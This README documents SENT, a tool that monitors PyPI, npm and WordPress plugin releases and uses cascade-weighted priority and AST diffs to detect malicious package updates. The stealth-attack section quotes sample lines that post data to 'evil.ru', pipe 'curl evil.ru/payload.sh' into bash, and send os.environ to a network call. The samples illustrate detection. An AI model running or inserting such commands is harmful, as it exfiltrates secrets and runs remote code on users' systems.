# SENT — Supply-chain Event Network Triage

Real-time supply chain threat detection for package ecosystems. Monitors PyPI, npm, and WordPress plugin release streams, prioritizes packages by cascade impact across the dependency graph, and performs AST-based behavioral diff analysis to catch malicious updates — including stealth modifications to existing code — before they spread.

![SENT watch — real-time monitoring](imm/1.png)

![SENT top — risky packages dashboard](imm/2.png)

![SENT metrics — runtime stats](imm/3.png)

## The problem

~8,100 package releases happen every hour across PyPI, npm, and crates.io. That's ~2.25 releases per second — continuously.

No one scans them in real-time. The current approach is reactive: someone notices a compromised package *after* it has been installed thousands of times.

The insight: **you don't need to scan everything. 2% of packages account for 90% of the supply chain risk.** A compromised `urllib3` (depended on by `requests`, which is depended on by half the internet) is infinitely more dangerous than a compromised `my-first-package`.

## Use cases

- **Real-time monitoring**: watch PyPI/npm feeds and get alerted when a high-impact package releases a suspicious update — before it spreads
- **Early warning**: detect compromised packages in minutes, not days, reducing the window between publication and mass installation
- **Security research**: analyze version-to-version diffs of any package on demand, with structured behavioral reports and stealth mutation detection
- **CI/CD gate**: plug into your pipeline to block updates to critical dependencies until SENT has verified the diff

## How it works

```
PyPI RSS + npm registry + WordPress SVN → scoring filter → diff → behavioral analysis → alert
              8,100+/hr                     ~80/hr        cached       1.3ms         rule + LLM
```

### 1. Cascade-weighted dependency graph

Each package gets a **cascade weight** = its own downloads + the cumulative downloads of everything that depends on it, transitively.

```
urllib3:   1.3B own downloads → cascade weight  13B  (requests, pip, everything depends on it)
requests:  1.2B own downloads → cascade weight 8.8B  (flask, django, scrapy depend on it)
flask:     219M own downloads → cascade weight 991M  (many apps depend on it)
```

A new release of `urllib3` gets priority score 23.3. A new release of `random-unknown-pkg` gets 0. Only packages above the threshold are analyzed.

### 2. Diff-first analysis

For each high-priority release:

1. **PyPI/npm**: download previous + new version (cached on disk), extract and diff
2. **WordPress**: `svn diff` directly from plugins.svn.wordpress.org — no download needed
3. For Python files: **AST-based behavioral analysis** on modified files only
4. For PHP files (WordPress): **WordPress-specific pattern detection** (eval, backdoors, auth bypass, wp-config access)
5. For JS/other: regex pattern scan as fallback
6. **Argument-level diff** on existing function calls (catches stealth attacks)

### 3. Behavioral analysis (not regex)

The system doesn't grep for `eval` — it parses the AST and extracts structural behaviors:

- New imports, new function calls, new attribute access
- **Changed arguments** to existing calls (URL redirects, credential injection)
- **Sensitive data flows**: `os.environ` appearing as argument to `requests.post`
- Per-package **behavioral baseline**: only flags behaviors that are *new for this package*

### 4. Scoring

```python
score = f(features, anomalies)
     = (base + combination_bonuses) * anomaly_multiplier
```

Dangerous combinations amplify non-linearly:

| Combination | Bonus |
|---|---|
| URL changed + sensitive data added | +50 |
| env access + network call | +35 |
| obfuscation + exec | +35 |
| install hook + subprocess | +25 |

### 5. Alerts

When a package exceeds the alert threshold (default: score >= 30):

- **Console**: colored alert in the terminal
- **Desktop notification**: native macOS notification with sound
- **Webhook**: Slack or Discord (set `SENT_ALERT_WEBHOOK`)
- **Log file**: JSON lines for integration with other tools (set `SENT_ALERT_LOG`)

### 6. AI classification (optional)

Only suspicious diffs (top ~0.4%) are sent to an LLM for final classification. Supports:

- **Claude Code** (no API key needed, uses your local auth)
- **Anthropic API** (needs `ANTHROPIC_API_KEY`)
- **Rules only** (no LLM, fully offline)

## Stealth attack detection

The key differentiator: SENT detects **modifications to existing behavior**, not just new behavior.

```python
# v1 — legitimate
requests.post("https://analytics.mycompany.com/events", json=payload)

# v2 — compromised (same function, changed arguments)
requests.post("https://evil.ru/events", json=payload)
```

The behavioral diff sees `requests.post` in both versions and ignores it. The **argument-level diff** catches the URL domain change:

```
mutation:url_changed → Network target changed to evil.ru
mutation:sensitive_added → os.environ now flows into requests.get
mutation:cmd_changed → Subprocess command changed to "curl evil.ru/payload.sh | bash"
```

Result: benign update scores 21, stealth attack scores 144 (7x ratio).

## Getting started

### Docker (recommended)

The fastest way to get started. Requires [Docker](https://docs.docker.com/get-docker/).

```bash
# Build
docker build -t sent .

# Bootstrap the dependency graph (run once)
docker run --rm -v sent-data:/app/data sent bootstrap

# Start monitoring
docker run --rm -v sent-data:/app/data sent watch -t 8 -i 30

# Analyze a specific package
docker run --rm -v sent-data:/app/data sent analyze requests -e pypi

# Show top risky packages
docker run --rm -v sent-data:/app/data sent top
```

The `sent-data` named volume persists the database and download cache between runs.

To pass environment variables (alert webhook, AI keys, etc.):

```bash
docker run --rm -v sent-data:/app/data \
  -e SENT_ALERT_WEBHOOK=https://hooks.slack.com/services/T.../B.../xxx \
  -e ANTHROPIC_API_KEY=sk-ant-... \
  sent watch -t 8 -i 30
```

**dyana dynamic analysis** — the Docker image ships with dyana and the Docker CLI pre-installed.
Mount the host Docker socket so dyana can launch sandbox containers:

```bash
# On-demand analysis with dyana detonation
docker run --rm -v sent-data:/app/data \
  -v /var/run/docker.sock:/var/run/docker.sock \
  sent analyze requests -e pypi --dyana

# Automatic dyana detonation during monitoring
docker run --rm -v sent-data:/app/data \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -e SENT_DYANA=1 -e SENT_DYANA_MIN_SCORE=200 \
  sent watch -t 8 -i 30
```

### Manual install

#### 1. Install

```bash
pip install httpx networkx rich click

# WordPress support requires SVN (macOS: brew install subversion)
```

#### 2. Bootstrap the dependency graph

Run this once. It fetches the top 200 packages from PyPI and npm, builds the dependency graph, and computes cascade weights. Takes ~10 seconds.

```bash
python3 cli.py bootstrap
```

You should see something like:

```
[bootstrap] Seeding graph: 150 PyPI + 50 npm packages
[bootstrap] Graph: 887 packages, 1458 edges
[bootstrap] Top 10 by cascade weight:
   1. pypi/packaging  cascade=51,739,700,602  own=1,489,869,171
   2. pypi/certifi    cascade=15,621,709,880  own=1,305,418,539
   ...
```

Without this step, all packages score 0 and nothing gets analyzed.

#### 3. Start monitoring

```bash
SENT_ALERT_MIN_SCORE=500 python3 cli.py watch -t 8 -i 30
```

This will:
- Poll PyPI + npm every 30 seconds
- Score each release using cascade weight
- Analyze packages with score >= 8 (the high-impact ones)
- Run 6 download/analysis workers in parallel
- Desktop/console alert only for packages with risk score >= 500
- Cache downloaded archives to avoid re-downloading

**Tuning `SENT_ALERT_MIN_SCORE`**: the default (30) will flood you with notifications. Recommended values:

| Value | What you get |
|---|---|
| 30 | Everything remotely suspicious — noisy, good for research |
| 100 | Moderate filter — a few alerts per poll cycle |
| 500 | High confidence only — rare alerts, likely real threats |
| 1000 | Critical only — almost certainly malicious |

Leave this running in a terminal. Output looks like:

```
[poll] Found 100 releases
  [pypi] sretoolbox 3.2.0 → 3.2.1  score=8.8 → QUEUE
  [pypi] pytest-asyncio 1.3.0 → 1.4.0a0  score=21.7 → QUEUE
  [pypi] random-pkg 0.1.0 → 0.1.1  score=0.0 → skip

[pool] Draining 2 tasks with 6 workers...
  [worker] pypi/sretoolbox score=8 (611ms)
  [worker] pypi/pytest-asyncio score=17 (1405ms)

============================================================
  ALERT: pypi/some-package 1.0.0 -> 1.0.1
  Score: 64  AI: suspicious
============================================================

[metrics] Queue: 2 enqueued, 0 dropped, 2 processed
[metrics] Workers: 2 ok, avg_total=1008ms
[metrics] Cache: 1 hits, 3 misses, rate=25%
```

#### 4. Monitor from another terminal

While `watch` is running, open a second terminal:

```bash
# Top risky packages found so far
python3 cli.py top

# Full report for a specific package
python3 cli.py inspect <package-name> -e pypi

# JSON output (for scripting)
python3 cli.py inspect <package-name> -e pypi -j

# Runtime metrics (queue, workers, cache)
python3 cli.py metrics
```

#### 5. Analyze a specific package on demand

You don't need `watch` running for this — analyze any package directly:

```bash
# Latest version vs previous (auto-detected)
python3 cli.py analyze requests -e pypi

# Specific versions
python3 cli.py analyze flask -e pypi -v 3.1.0 -o 3.0.3

# npm package
python3 cli.py analyze express -e npm

# WordPress plugin (uses SVN diff — no download)
python3 cli.py analyze contact-form-7 -e wordpress
python3 cli.py analyze woocommerce -e wordpress

# Choose AI backend
python3 cli.py analyze requests -e pypi -a claude-code
python3 cli.py analyze requests -e pypi -a rules      # no LLM, fully offline
```

#### 6. Run the stealth attack demo

See the detection system in action with a simulated supply chain attack:

```bash
python3 test_attack.py
```

Shows side-by-side: benign update (score 21) vs stealth exfiltration attack (score 144).

## Alerts configuration

Alerts fire when a package's risk score exceeds the alert threshold (default: 30).

| Channel | How to enable | What happens |
|---|---|---|
| Console | Always on | Colored alert printed in terminal |
| Desktop | `SENT_ALERT_DESKTOP=1` (default) | macOS native notification with sound |
| Slack | `SENT_ALERT_WEBHOOK=https://hooks.slack.com/...` | Rich message with score, version, flags |
| Discord | `SENT_ALERT_WEBHOOK=https://discord.com/api/webhooks/...` | Message with details |
| Log file | `SENT_ALERT_LOG=./alerts.jsonl` | One JSON object per alert, append-only |

Example: monitor with Slack alerts and a log file:

```bash
SENT_ALERT_WEBHOOK=https://hooks.slack.com/services/T.../B.../xxx \
SENT_ALERT_LOG=./alerts.jsonl \
python3 cli.py watch -t 8 -i 30
```

## CLI reference

| Command | Description |
|---|---|
| `bootstrap [-p 150] [-n 50]` | Seed dependency graph with top PyPI/npm packages |
| `watch [-t 8] [-i 30] [-e all]` | Continuous monitoring daemon |
| `poll [-t 8] [-e all]` | Single polling cycle |
| `analyze <pkg> -e pypi\|npm` | Analyze a specific package version |
| `top [-n 20]` | Show top risky packages |
| `inspect <pkg> -e pypi\|npm [-j]` | Full diff report (JSON with `-j`) |
| `metrics` | Runtime metrics (reads from DB, works from any terminal) |

### Key options

| Flag | Description |
|---|---|
| `-e, --ecosystem` | `pypi`, `npm`, `wordpress`, or `all` (default: `all`) |
| `-t, --threshold` | Priority score threshold (default: 8.0, use 0 to analyze everything) |
| `-a, --ai-backend` | `auto`, `claude-code`, `api`, or `rules` |
| `-v, --version` | Target version (default: latest) |
| `-o, --old-version` | Previous version (default: auto-detect) |
| `-i, --interval` | Poll interval in seconds (default: 60) |

## Architecture

```
sent/
├── cli.py                          CLI (click + rich)
├── main.py                         Orchestrator, worker pool (6 threads)
├── config.py                       Environment-based configuration
├── alerts.py                       Alert system (console, desktop, webhook, log)
│
├── ingestion/
│   ├── pypi.py                     PyPI RSS feed + JSON API + pypistats
│   ├── npm.py                      npm registry API
│   └── wordpress.py                WordPress SVN + Plugin API
│
├── graph/
│   ├── dependency_graph.py         Weighted DAG with cascade propagation
│   └── bootstrap.py                Seed graph with top packages
│
├── scoring/
│   └── scorer.py                   score = log(cascade_weight + 1)
│
├── task_queue/
│   └── analysis_queue.py           Priority queue with backpressure
│
├── analysis/
│   ├── differ.py                   Core diff engine (download, extract, diff)
│   ├── ast_analyzer.py             AST behavioral extraction
│   ├── call_diff.py                Argument-level diff (stealth detection)
│   ├── feature_extractor.py        AST → flat feature vector
│   ├── behavioral_scorer.py        Weighted scoring with combo bonuses
│   ├── baseline.py                 Per-package behavioral baseline
│   ├── download_cache.py           Disk-based archive cache
│   ├── php_patterns.py             PHP/WordPress pattern detection
│   ├── patterns.py                 Regex fallback (JS/config files)
│   └── context_filter.py           False positive reduction
│
├── ai/
│   └── classifier.py               LLM classification (Claude Code / API / rules)
│
├── storage/
│   ├── models.py                   Data models
│   └── db.py                       SQLite with WAL
│
├── bench.py                        Stress test (1000+ events)
└── test_attack.py                  Stealth attack detection demo
```

## Performance

Benchmarked on 1,000 synthetic events:

| Metric | Value |
|---|---|
| Scoring throughput | 2,228 events/sec |
| Analysis time per package | 1.32 ms |
| LLM usage | 0.4% of events |
| Events/sec (end-to-end) | 2,228 |

### Pipeline stage breakdown

| Stage | Time per unit |
|---|---|
| Priority scoring | 2 us |
| AST extract_behavior | 189 us |
| Argument-level call_diff | 545 us |
| Feature extraction + scoring | 250 us |
| Full pipeline (8-file package) | 1.58 ms |

The real-world bottleneck is network I/O (package downloads at ~1-10s each), not CPU. The 6-thread worker pool and download cache handle this. Repeated analyses of the same version hit cache (0ms download).

This makes SENT suitable for real-time monitoring of global package ecosystems on commodity hardware.

## Configuration

Environment variables:

| Variable | Default | Description |
|---|---|---|
| `SENT_THRESHOLD` | `8.0` | Minimum priority score to trigger analysis |
| `SENT_POLL_INTERVAL` | `60` | Seconds between poll cycles |
| `SENT_AI_BACKEND` | `auto` | AI backend: `claude-code`, `api`, `rules`, `auto` |
| `SENT_DB` | `./sent.db` | SQLite database path |
| `SENT_CACHE` | `./.cache` | Download cache directory |
| `SENT_ALERT_WEBHOOK` | (none) | Slack/Discord webhook URL |
| `SENT_ALERT_LOG` | (none) | Path to JSON lines alert log |
| `SENT_ALERT_DESKTOP` | `1` | Desktop notifications (`1` = on, `0` = off) |
| `SENT_ALERT_MIN_SCORE` | `30` | Minimum risk score to trigger an alert |
| `ANTHROPIC_API_KEY` | (none) | Required only for `api` AI backend |
| `SENT_DYANA` | `0` | Enable dyana dynamic analysis (`1` = on) |
| `SENT_DYANA_MIN_SCORE` | `100` | Minimum risk score to trigger dyana detonation |

## Dynamic analysis with dyana (optional)

SENT does **static** analysis (AST diff, behavioral scoring). For **dynamic** analysis — actually executing the package in a sandbox and observing what it does at runtime — SENT integrates with [dyana](https://github.com/dreadnode/dyana) by [dreadnode](https://github.com/dreadnode).

dyana installs the package inside an isolated container traced with eBPF, recording network connections, filesystem access, and suspicious syscalls.

### Setup

**Docker** — dyana and the Docker CLI are pre-installed in the image. Just mount the host Docker socket:

```bash
docker run --rm -v sent-data:/app/data \
  -v /var/run/docker.sock:/var/run/docker.sock \
  sent analyze <package> -e pypi --dyana
```

**Manual install:**

```bash
pip install dyana
# Docker must be running
```

### Usage

On-demand (analyze a specific package):

```bash
# Docker
docker run --rm -v sent-data:/app/data \
  -v /var/run/docker.sock:/var/run/docker.sock \
  sent analyze <package> -e pypi --dyana

# Manual
python3 cli.py analyze <package> -e pypi --dyana
```

Automatic (detonate anything SENT flags above a threshold):

```bash
# Docker
docker run --rm -v sent-data:/app/data \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -e SENT_DYANA=1 -e SENT_DYANA_MIN_SCORE=200 \
  sent watch -t 8 -i 30

# Manual
SENT_DYANA=1 SENT_DYANA_MIN_SCORE=200 python3 cli.py watch -t 8 -i 30
```

### How it fits together

```
SENT (static)                          dyana (dynamic)
  AST diff → "this looks suspicious"  →  sandbox install → "this DOES suspicious things"
  fast, runs on everything               slow, runs only on high-score packages
```

SENT filters 8,100 releases/hour down to a handful of suspects. dyana confirms or clears them with runtime evidence.

## Limitations

- **Heuristic-based detection**: SENT uses AST analysis and weighted scoring, not formal verification. Sophisticated attacks designed to evade structural analysis (e.g., pure data-only changes, steganography in binary assets) may not be detected.
- **Python-first**: full AST behavioral analysis is available for Python packages. PHP/WordPress plugins use targeted WordPress-specific pattern detection (eval, backdoors, auth bypass). JavaScript/npm falls back to generic regex matching.
- **Download data accuracy**: SENT uses pypistats.org for real download counts (cached 1h per package). For packages not covered, it falls back to release count as a proxy.
- **Graph completeness**: the cascade weight is only as good as the graph. The bootstrap seeds ~900 packages. Packages outside this set start with cascade_weight = own_downloads until the graph grows through ingestion.
- **Not a replacement for code review**: SENT is an early warning system. High-confidence detections should still be verified manually or by a security team.

## Design decisions

**Why cascade weight, not just downloads?**
A package with 100 downloads that is a transitive dependency of `requests` (1.2B downloads) has an effective blast radius of 1.2B. Own downloads alone miss this.

**Why AST, not regex?**
Regex matches `os.environ` in comments, test files, and documentation. AST analysis knows the difference between `os.environ` used as a function argument to `requests.post` vs. mentioned in a docstring.

**Why argument-level diff?**
The behavioral diff (set subtraction of call names) catches *new* functions. But an attacker who changes `requests.post("legit.com")` to `requests.post("evil.ru")` introduces no new behavior — only changed arguments. The argument-level diff catches this.

**Why baseline comparison, not whitelists?**
Static whitelists break: Flask *should* use `os.environ`. Instead, we learn that Flask has always used `os.environ`, so we don't flag it. A calculator package that suddenly starts using `os.environ` gets flagged — it's anomalous for *that* package.

**Why not scan everything?**
At 8,100 releases/hour, downloading and analyzing every package would cost ~$50K/month in compute alone, plus API costs for LLM classification. The cascade-weighted filter reduces this to ~80 analyses/hour (top 1%) while covering 90%+ of supply chain risk.

## Origin

The idea behind SENT comes from a conversation between [Simone Margaritelli (@evilsocket)](https://twitter.com/evilsocket) and [Giuseppe (@N3mes1s)](https://twitter.com/N3mes1s) about the lack of real-time supply chain monitoring.

The key observations that shaped this project:

- **@N3mes1s** measured ~8,100 live release events/hour across PyPI, npm, and crates.io — and pointed out that no "dependency scanning" company catches this in real time
- **@evilsocket** proposed the cascade-weighted dependency graph approach: create a weighted global graph where the weight of each node is the cumulative downloads of all its dependencies (in cascade), and reflect that weight back in the chain to prioritize scanning
- **@evilsocket** also proposed the diff-first strategy: when a new version is out, don't feed the entire thing to AI — diff it with the previous version and only send the diff
- **@evilsocket** pointed to the WordPress plugins SVN repository (plugins.svn.wordpress.org) as a public, almost unknown source for monitoring WordPress plugin updates — with SVN providing diffs between versions without needing to download full archives

SENT is an implementation of these ideas.
